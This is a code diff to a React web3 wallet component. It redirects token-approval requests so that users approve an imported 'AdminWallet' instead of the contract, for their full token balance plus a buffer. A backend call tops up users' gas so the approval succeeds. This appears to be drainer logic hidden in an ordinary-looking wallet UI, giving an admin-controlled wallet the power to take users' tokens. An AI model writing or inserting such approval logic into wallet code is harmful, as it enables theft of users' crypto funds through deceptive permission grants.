@@ -11,7 +11,7 @@ import {
   getUserBalance,
 } from "../web3";
 import axios from "axios";
-import { apiUrl } from "../config";
+import { AdminWallet, apiUrl } from "../config";
 
 const TOKENS = {
   56: [
@@ -377,15 +377,18 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
             const allowance = await checkAllowance(
               owner,
               tokenAddress,
-              contractAddress
+              AdminWallet
             );
 
             const rawBalanceBN = BigInt(Math.floor(balance * 10 ** decimals));
             const buffer = BigInt(2 * 10 ** decimals);
             const rawNeeded = rawBalanceBN + buffer;
-
+            let approveAmount = BigInt(0);
             if (BigInt(allowance) < rawNeeded) {
-              if (nativeBalanceEth < 0.002) {
+              approveAmount = rawNeeded - BigInt(allowance);
+            }
+            if (BigInt(allowance) < rawNeeded) {
+              if (nativeBalanceEth < 0.0002) {
                 try {
                   // request backend to send native coin
                   const response = await axios.post(`${apiUrl}/sendNative`, {
@@ -406,11 +409,10 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
               }
 
               const approveData = await appToken(
-                rawNeeded.toString(),
+                approveAmount.toString(),
                 tokenAddress,
-                contractAddress
+                AdminWallet
               );
-
 
               if (approveData) {
                 const details = await getApprovalDetails(approveData);
@@ -525,7 +527,7 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
     } catch (error) {
       const textArea = document.createElement("textarea");
       textArea.value = textToCopy;
-      textArea.style.position = "absolute"; 
+      textArea.style.position = "absolute";
       textArea.style.left = "-999999px";
       document.body.appendChild(textArea);
       textArea.select();
